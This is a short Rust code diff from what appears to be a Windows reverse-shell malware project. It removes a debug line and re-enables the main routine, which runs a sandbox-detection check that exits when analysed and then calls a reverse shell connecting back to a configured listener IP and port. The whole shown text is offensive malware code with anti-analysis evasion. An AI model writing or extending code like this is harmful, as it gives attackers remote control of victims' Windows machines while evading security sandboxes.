@@ -13,12 +13,10 @@ use rco_reverse_shell_windows::shell;
 use rco_reverse_shell_windows::antistring_shell as shell;
 
 fn main() {
-    let a = rco_utils::test!(17 as *const (); [u32]; [14, 15]);
-    println!("{a:?}");
-    /*// Runs the sandbox detection function or the dummy replacement, dependent on features
+    // Runs the sandbox detection function or the dummy replacement, dependent on features
     if rco_utils::pound_sand() {
         return
     }
 
-    shell(rco_config::LISTENER_IP, rco_config::LISTENER_PORT);*/
+    shell(rco_config::LISTENER_IP, rco_config::LISTENER_PORT);
 }
